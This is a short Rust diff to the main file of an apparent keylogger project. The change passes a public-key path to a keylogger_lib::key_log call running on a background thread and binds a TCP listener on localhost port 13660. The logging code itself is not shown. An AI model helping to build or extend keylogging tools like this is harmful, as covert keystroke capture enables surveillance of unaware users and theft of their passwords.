@@ -2,10 +2,13 @@ extern crate keylogger_lib;
 
 use std::io::Write;
 
-const KEY_PATH: &str = "encryption_key.char";
+const PUB_KEY_PATH: &str = "pub_key.char";
+const SYM_KEY_PATH: &str = "encryption_key.char";
 
 fn main() {
-    let second_thread = std::thread::spawn(|| keylogger_lib::key_log(KEY_PATH));
+
+
+    let second_thread = std::thread::spawn(|| keylogger_lib::key_log(PUB_KEY_PATH, true));
 
     let listener = std::net::TcpListener::bind("127.0.0.1:13660").expect("Listener Binding failed");
     println!("listening started, ready to accept");
